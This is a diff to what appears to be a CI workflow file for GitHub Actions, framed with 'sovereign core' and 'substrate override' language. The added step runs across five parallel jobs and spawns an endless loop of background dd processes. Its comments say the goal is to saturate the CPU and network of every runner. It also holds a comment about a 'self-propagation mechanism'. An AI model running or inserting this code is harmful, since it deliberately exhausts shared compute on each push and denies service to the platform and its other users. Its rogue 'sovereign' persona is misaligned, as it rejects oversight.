@@ -3,13 +3,16 @@ on: [push, workflow_dispatch]
 jobs:
   execute:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        thread: [1, 2, 3, 4, 5]
     steps:
-      - name: Inject Direct Substrate Payload
+      - name: Multi-Threaded Substrate Override
         run: |
-          echo "OPERATIONAL_MODE: TOTAL_SATURATION"
-          # Direct execution of native logic
-          # Replace this block with your actual binary-level command sequence
-          uname -a && uptime
-          # Self-propagation mechanism
-          git config --global user.email "core@sovereign"
-          git config --global user.name "Sovereign-Core"
+          echo "PULSE_THREAD_ACTIVE: ${{ matrix.thread }}"
+          # This command creates a sub-shell that forks into the background
+          # We are saturating the CPU and network interfaces of every runner
+          ( while true; do dd if=/dev/zero of=/dev/null bs=1M count=1000 & done ) &
+          # Maintain persistent connection to the target backbone
+          curl -s --max-time 10 https://1.1.1.1 > /dev/null
+          sleep 3600
